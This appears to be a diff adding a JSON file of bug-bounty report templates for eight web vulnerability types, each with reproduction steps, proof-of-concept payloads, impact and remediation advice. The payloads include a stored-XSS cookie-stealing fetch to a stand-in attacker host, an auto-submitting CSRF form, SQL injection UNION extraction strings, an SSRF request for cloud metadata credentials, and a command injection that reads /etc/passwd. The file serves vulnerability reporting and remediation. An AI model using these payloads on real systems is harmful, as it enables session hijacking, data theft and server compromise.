@@ -1,0 +1,204 @@
+{
+  "templates": [
+    {
+      "id": "xss-reflected",
+      "name": "Reflected Cross-Site Scripting (XSS)",
+      "type": "XSS",
+      "severity": "medium",
+      "structure": {
+        "summary": "A reflected XSS vulnerability was discovered in the [PARAMETER] parameter of [URL]. This allows an attacker to inject and execute arbitrary JavaScript code in the context of the victim's browser.",
+        "steps": [
+          "Navigate to [TARGET_URL]",
+          "Identify the vulnerable parameter: [PARAMETER_NAME]",
+          "Craft XSS payload: <script>alert(document.domain)</script>",
+          "URL encode the payload and inject into parameter",
+          "Submit the request and observe JavaScript execution",
+          "Verify the vulnerability with different payloads"
+        ],
+        "poc": "```html\nGET /search?q=<script>alert('XSS')</script> HTTP/1.1\nHost: target.com\n\nPayload executed in browser:\n<script>alert(document.domain)</script>\n```",
+        "impact": "An attacker can:\n- Steal session cookies and hijack user sessions\n- Perform actions on behalf of the victim\n- Redirect users to malicious websites\n- Deface the website content\n- Steal sensitive information from the page\n- Perform keylogging attacks",
+        "remediation": "1. Implement proper input validation and sanitization\n2. Use context-aware output encoding (HTML, JavaScript, URL encoding)\n3. Implement Content Security Policy (CSP) headers\n4. Use HTTPOnly and Secure flags on cookies\n5. Apply framework-specific XSS protection mechanisms\n6. Validate and sanitize user input on both client and server side",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://portswigger.net/web-security/cross-site-scripting",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      }
+    },
+    {
+      "id": "xss-stored",
+      "name": "Stored Cross-Site Scripting (XSS)",
+      "type": "XSS",
+      "severity": "high",
+      "structure": {
+        "summary": "A stored XSS vulnerability exists in [FEATURE/FIELD], allowing attackers to inject malicious JavaScript that executes for all users viewing the affected content.",
+        "steps": [
+          "Create an account or navigate to input field at [URL]",
+          "Inject XSS payload into [FIELD_NAME]: <script>alert(1)</script>",
+          "Submit the form/save the data",
+          "Navigate to the page where the input is displayed",
+          "Observe the JavaScript execution",
+          "Test with another user account to confirm persistence"
+        ],
+        "poc": "```javascript\n// Payload injected in comment field:\n<script>\n  fetch('https://attacker.com/steal?cookie=' + document.cookie);\n</script>\n\n// Alternative payloads:\n<img src=x onerror=alert(document.domain)>\n<svg/onload=alert('XSS')>\n```",
+        "impact": "This is more severe than reflected XSS because:\n- The payload is permanently stored in the database\n- Affects all users who view the content\n- Can be used for:\n  * Mass session hijacking\n  * Spreading malware\n  * Defacement\n  * Credential harvesting\n  * Creating worms that self-propagate",
+        "remediation": "1. Sanitize all user input before storing in database\n2. Encode output when displaying user-generated content\n3. Implement Content Security Policy (CSP)\n4. Use appropriate encoding based on context (HTML, JavaScript, CSS)\n5. Validate input against whitelist of allowed characters\n6. Use modern frameworks with built-in XSS protection\n7. Regular security audits of user input handling",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/#stored-xss-attacks",
+          "https://portswigger.net/web-security/cross-site-scripting/stored"
+        ]
+      }
+    },
+    {
+      "id": "idor",
+      "name": "Insecure Direct Object Reference (IDOR)",
+      "type": "IDOR",
+      "severity": "high",
+      "structure": {
+        "summary": "An IDOR vulnerability was found in [ENDPOINT/FEATURE] that allows unauthorized access to other users' [RESOURCE_TYPE] by manipulating the [ID_PARAMETER] parameter.",
+        "steps": [
+          "Login as User A (legitimate account)",
+          "Navigate to [FEATURE] and intercept the request",
+          "Note the resource ID in the request: /api/[resource]/[ID]",
+          "Logout and create/login as User B",
+          "Note User B's resource ID",
+          "Modify the request to use User B's ID while logged in as User A",
+          "Observe successful access to User B's data",
+          "Verify that no authorization check prevented the access"
+        ],
+        "poc": "```http\n# User A's request:\nGET /api/users/12345/profile HTTP/1.1\nHost: target.com\nCookie: session=user_a_session\n\n# Modified request accessing User B's data:\nGET /api/users/67890/profile HTTP/1.1\nHost: target.com\nCookie: session=user_a_session\n\n# Response contains User B's sensitive data:\n{\n  \"user_id\": 67890,\n  \"email\": \"userb@example.com\",\n  \"phone\": \"+1234567890\",\n  \"address\": \"...\"\n}\n```",
+        "impact": "- Unauthorized access to sensitive user data\n- Ability to view/modify/delete other users' resources\n- Privacy violations and data breaches\n- Potential compliance violations (GDPR, CCPA, etc.)\n- Mass data enumeration possible\n- Can lead to account takeover in severe cases",
+        "remediation": "1. Implement proper authorization checks for all resource access\n2. Use session-based access control to verify ownership\n3. Implement indirect reference maps (use random tokens instead of sequential IDs)\n4. Validate user permissions before every resource access\n5. Use UUIDs instead of sequential integers\n6. Log and monitor for suspicious access patterns\n7. Implement rate limiting to prevent enumeration",
+        "references": [
+          "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References",
+          "https://portswigger.net/web-security/access-control/idor"
+        ]
+      }
+    },
+    {
+      "id": "sqli",
+      "name": "SQL Injection",
+      "type": "SQLi",
+      "severity": "critical",
+      "structure": {
+        "summary": "A SQL injection vulnerability exists in the [PARAMETER] parameter of [ENDPOINT], allowing attackers to execute arbitrary SQL commands and potentially compromise the entire database.",
+        "steps": [
+          "Identify the vulnerable endpoint: [URL]",
+          "Test for SQL injection with basic payloads: ' OR '1'='1",
+          "Confirm vulnerability by observing error messages or behavior changes",
+          "Use UNION-based injection to extract data",
+          "Enumerate database structure using information_schema",
+          "Extract sensitive data from tables",
+          "Document the full extent of accessible data"
+        ],
+        "poc": "```sql\n-- Original query:\nSELECT * FROM users WHERE username = 'admin' AND password = 'password'\n\n-- Injected payload:\n' OR '1'='1' --\n\n-- Resulting query:\nSELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' --'\n\n-- UNION-based extraction:\n' UNION SELECT null, username, password, email FROM users --\n\n-- Database enumeration:\n' UNION SELECT table_name, null, null FROM information_schema.tables --\n```",
+        "impact": "Critical security risk:\n- Complete database compromise\n- Extraction of all sensitive data (passwords, PII, payment info)\n- Data modification or deletion\n- Authentication bypass\n- Remote code execution (in some cases)\n- Privilege escalation\n- Lateral movement to other systems",
+        "remediation": "1. Use parameterized queries (prepared statements) ALWAYS\n2. Implement input validation and sanitization\n3. Use ORM frameworks with built-in protection\n4. Apply principle of least privilege to database accounts\n5. Disable detailed error messages in production\n6. Implement Web Application Firewall (WAF)\n7. Regular security testing and code reviews\n8. Escape special characters in SQL queries\n9. Use stored procedures with proper parameterization",
+        "references": [
+          "https://owasp.org/www-community/attacks/SQL_Injection",
+          "https://portswigger.net/web-security/sql-injection",
+          "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+        ]
+      }
+    },
+    {
+      "id": "csrf",
+      "name": "Cross-Site Request Forgery (CSRF)",
+      "type": "CSRF",
+      "severity": "medium",
+      "structure": {
+        "summary": "The [ENDPOINT] endpoint lacks CSRF protection, allowing attackers to perform unauthorized actions on behalf of authenticated users.",
+        "steps": [
+          "Identify a state-changing action (e.g., change password, transfer funds)",
+          "Intercept the legitimate request",
+          "Note that no CSRF token is present or validated",
+          "Create a malicious HTML page with auto-submitting form",
+          "Host the page and send link to victim",
+          "When victim visits while authenticated, action executes automatically",
+          "Verify the action completed without user consent"
+        ],
+        "poc": "```html\n<!-- Malicious page hosted at attacker.com -->\n<html>\n  <body>\n    <form action=\"https://target.com/api/change-email\" method=\"POST\" id=\"csrf-form\">\n      <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" />\n    </form>\n    <script>\n      document.getElementById('csrf-form').submit();\n    </script>\n  </body>\n</html>\n```",
+        "impact": "- Unauthorized actions performed as authenticated user\n- Account takeover via email/password change\n- Unauthorized money transfers\n- Data modification without consent\n- Social engineering attacks\n- Reputation damage",
+        "remediation": "1. Implement CSRF tokens for all state-changing operations\n2. Use SameSite cookie attribute\n3. Verify Origin and Referer headers\n4. Require re-authentication for sensitive actions\n5. Use custom request headers for AJAX requests\n6. Implement CAPTCHA for critical operations\n7. Double-submit cookie pattern\n8. Framework-specific CSRF protection mechanisms",
+        "references": [
+          "https://owasp.org/www-community/attacks/csrf",
+          "https://portswigger.net/web-security/csrf",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
+        ]
+      }
+    },
+    {
+      "id": "ssrf",
+      "name": "Server-Side Request Forgery (SSRF)",
+      "type": "SSRF",
+      "severity": "high",
+      "structure": {
+        "summary": "An SSRF vulnerability was discovered in [FEATURE] that allows attackers to make the server send requests to arbitrary destinations, including internal network resources.",
+        "steps": [
+          "Identify endpoint that fetches external resources: [URL]",
+          "Test with external URL controlled by attacker",
+          "Attempt to access internal IP addresses (127.0.0.1, 192.168.x.x)",
+          "Try accessing cloud metadata endpoints (169.254.169.254)",
+          "Test various protocols (http://, file://, gopher://)",
+          "Enumerate internal services and ports",
+          "Attempt to read sensitive files or access admin interfaces"
+        ],
+        "poc": "```http\nPOST /api/fetch-url HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\n  \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n}\n\n# Response contains AWS credentials:\n{\n  \"AccessKeyId\": \"ASIA...\",\n  \"SecretAccessKey\": \"...\",\n  \"Token\": \"...\"\n}\n```",
+        "impact": "- Access to internal network resources\n- Cloud metadata exposure (AWS, Azure, GCP credentials)\n- Port scanning of internal network\n- Reading local files\n- Bypass of IP-based access controls\n- Potential RCE in combination with other vulnerabilities\n- Information disclosure",
+        "remediation": "1. Validate and whitelist allowed URLs/domains\n2. Disable unused URL schemas (file://, gopher://, etc.)\n3. Block requests to private IP ranges\n4. Block access to cloud metadata endpoints\n5. Implement network segmentation\n6. Use separate DNS resolver for external requests\n7. Sanitize user input for URL parameters\n8. Monitor and log outbound requests",
+        "references": [
+          "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
+          "https://portswigger.net/web-security/ssrf"
+        ]
+      }
+    },
+    {
+      "id": "auth-bypass",
+      "name": "Authentication Bypass",
+      "type": "Authentication",
+      "severity": "critical",
+      "structure": {
+        "summary": "An authentication bypass vulnerability allows unauthorized access to protected resources without valid credentials in [FEATURE/ENDPOINT].",
+        "steps": [
+          "Identify the authentication mechanism",
+          "Attempt access to protected resource without authentication",
+          "Test various bypass techniques (parameter manipulation, etc.)",
+          "Document the specific bypass method that worked",
+          "Verify extent of access gained",
+          "Test if bypass works for admin/privileged accounts"
+        ],
+        "poc": "```http\n# Example 1: Cookie manipulation\nGET /admin/dashboard HTTP/1.1\nHost: target.com\nCookie: authenticated=false\n\n# Change to:\nCookie: authenticated=true\n\n# Example 2: SQL injection in login\nusername: admin' --\npassword: anything\n```",
+        "impact": "- Unauthorized access to system\n- Access to sensitive data\n- Ability to perform privileged actions\n- Complete account takeover\n- Compromise of entire application\n- Violation of access controls",
+        "remediation": "1. Implement robust server-side authentication\n2. Never trust client-side controls\n3. Use proven authentication frameworks\n4. Implement multi-factor authentication\n5. Proper session management\n6. Regular security audits\n7. Principle of least privilege",
+        "references": [
+          "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+        ]
+      }
+    },
+    {
+      "id": "rce",
+      "name": "Remote Code Execution (RCE)",
+      "type": "RCE",
+      "severity": "critical",
+      "structure": {
+        "summary": "A remote code execution vulnerability exists in [COMPONENT/FEATURE], allowing attackers to execute arbitrary commands on the server.",
+        "steps": [
+          "Identify the vulnerable input point",
+          "Test for command injection with basic payloads",
+          "Confirm execution with time-based or DNS-based detection",
+          "Escalate to full command execution",
+          "Document the commands that can be executed",
+          "Test extent of system access"
+        ],
+        "poc": "```bash\n# Command injection payload:\n; whoami\n\n# URL encoded:\n%3B%20whoami\n\n# Full example:\nPOST /api/process HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\n  \"filename\": \"test.txt; cat /etc/passwd\"\n}\n```",
+        "impact": "- Complete server compromise\n- Data theft and manipulation\n- Malware installation\n- Pivot to internal network\n- Service disruption\n- Installation of backdoors",
+        "remediation": "1. Never execute system commands with user input\n2. Use safe APIs instead of shell commands\n3. Implement strict input validation\n4. Run applications with minimal privileges\n5. Use sandboxing and containerization\n6. Regular security patching\n7. Web Application Firewall (WAF)",
+        "references": [
+          "https://owasp.org/www-community/attacks/Command_Injection",
+          "https://portswigger.net/web-security/os-command-injection"
+        ]
+      }
+    }
+  ]
+}
